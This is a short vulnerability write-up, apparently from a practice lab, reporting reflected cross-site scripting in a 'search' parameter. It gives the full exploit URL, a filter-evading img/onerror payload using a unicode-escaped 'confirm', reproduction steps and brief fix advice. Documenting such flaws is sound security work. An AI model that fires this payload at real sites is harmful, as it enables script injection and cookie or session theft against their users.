# Reflected Cross-Site Scripting (XSS) via `search` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `search` parameter of the application. User-controlled input is reflected into the response without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text
http://kzlabs.com/punishment/24.php?search=%3CiMg%20src=x%20onerror=\u0063onfirm?.(1)%3E
```

---

## Vulnerable Parameter

```text
search
```

---

## Payload Used

```html
<iMg src=x onerror=\u0063onfirm?.(1)>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/punishment/24.php?search=%3CiMg%20src=x%20onerror=\u0063onfirm?.(1)%3E
   ```

2. Observe that the payload is reflected into the HTML response.

3. The JavaScript executes automatically and triggers a popup.

---

## Proof of Concept

```text
http://kzlabs.com/punishment/24.php?search=%3CiMg%20src=x%20onerror=\u0063onfirm?.(1)%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/a766dfac-7212-4d1e-b731-2ddf3ad18c99" />


---

## Impact

* Session hijacking
* Cookie theft
* JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Secure rendering
